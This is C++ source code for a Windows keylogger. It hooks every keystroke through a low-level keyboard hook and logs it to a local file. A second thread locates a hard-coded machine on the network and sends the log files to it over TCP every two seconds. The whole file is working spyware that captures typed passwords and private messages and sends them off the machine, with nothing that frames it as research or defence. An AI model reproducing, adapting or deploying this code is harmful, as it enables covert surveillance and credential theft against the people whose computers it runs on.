#include <stdio.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>
#include <ws2tcpip.h>
#include <mswsock.h>
#include <filesystem>
#include <Windows.h>


using namespace std;

bool shift = false;

string logfile = "f.txt";
string streamfile = "f.txt";

string host = "";


string SERVER_IP = "192.168.40.28";
const int SERVER_PORT = 1235; 


string gethost(){
    FILE *f = popen("hostname", "r");
    char buf[100];
    fgets(buf, 100, f);
    pclose(f);
    string n = buf;
    return n.substr(0, n.size()-1);
}

string findIp(string hostname) {
    FILE *o = popen(("ping /n 1 -a " + hostname + " -4").c_str(), "r");
    // Sleep(10000);
    string ip = "";
    // format: >Pinging I-ACL-PF3TWBVD [10.228.161.97] with 32 bytes of data:
    char buf[100];
    fgets(buf, 100, o);
    if(buf[0] == 'P'){
        return "potato";
    }
    fgets(buf, 100, o);
    cout << buf;
    for (int a = 10 + hostname.size(); a < 100; a++) {
        if (buf[a] == ']')
            break;
        ip += buf[a];
    }
    pclose(o);
    return ip;
}

bool sendfile(SOCKET s, const char fname[]){
    HANDLE hFile = CreateFileA(fname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    bool b = TransmitFile(s, hFile, 0, 0, NULL, NULL, 0);
    CloseHandle(hFile);
    return b;
}

void sendstring(SOCKET s, string k){
    send(s, k.c_str(), k.length(), 0);
}

string filesize(const char n[]){
    filesystem::path p = n;
    uintmax_t m =  filesystem::file_size(p);
    return to_string(m);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        
        if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN){
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
            int h = p->vkCode;
            if (h == 160 || h == 161){
                shift = true;
                return(CallNextHookEx(NULL, nCode, wParam, lParam));
            }
            if (h >= 65 && h <= 90 && !shift) h += 32;
            char c = h;
            ofstream f;
            f.open(logfile, ios::app);
            f << c;
            f.close();   
        }

        if (wParam == WM_SYSKEYUP || wParam == WM_KEYUP){
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
            int h = p->vkCode;
            if (h == 160 || h == 161){
                shift = false ;
            }
        }
    }
    return(CallNextHookEx(NULL, nCode, wParam, lParam));
}


bool send(SOCKET sock){
    string size = filesize(streamfile.c_str());
    string send = "\"" + host + "\\keylog\\f.txt\""+size+"b";
    sendstring(sock, send.c_str());
    bool b = sendfile(sock, streamfile.c_str());
    sendfile(sock, "b.txt");
    string s = logfile;
    logfile = streamfile;
    streamfile = s;
    return b;
}


int sender(){


    bool connected = false;
    bool foundIp = false;


    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "could not initialize winsock" << endl;
        return 1;
    }


    while (true){

        SOCKET socket_fd;

        while (!connected){
            string IP = findIp("DESKTOP-29K26OS");
            cout << IP << "\n";
            if (IP != "potato"){
                SERVER_IP = IP;
                foundIp = true;
            }
            else continue;

            sockaddr_in serverAddr{};
            serverAddr.sin_family = AF_INET;
            serverAddr.sin_port = htons(SERVER_PORT);
            if (inet_pton(AF_INET, SERVER_IP.c_str(), &(serverAddr.sin_addr)) <= 0) {
                cout << "invalid IP." << endl;
            }   

            connected = true;
            socket_fd = socket(AF_INET, SOCK_STREAM, 0);
            if (socket_fd == INVALID_SOCKET) {
                cout << "could not make socket" << endl;
                shutdown(socket_fd, SD_SEND);
                closesocket(socket_fd);
                // WSACleanup();
                connected = false;
            }

            if (connect(socket_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
                cout << "could not connect to server" << endl;
                shutdown(socket_fd, SD_SEND);
                closesocket(socket_fd);
                // WSACleanup();
                connected = false;
            }
            this_thread::sleep_until(chrono::system_clock::now()+chrono::seconds(2));
        }
        cout << "sent\n";
        connected = send(socket_fd);
        this_thread::sleep_until(chrono::system_clock::now()+chrono::seconds(2));
    } 
}

void runlog(){
    HHOOK Kybd; 
    Kybd = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
    // Keep this app running until we're told to stop
    MSG msg;
    while (true) {
        GetMessage(&msg, NULL, NULL, NULL);
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(Kybd);
}

int main(){
    
    host = gethost();
    thread logger = thread(runlog);
    thread tcp = thread(sender);

    logger.join();
    tcp.join();

    return 0;
}
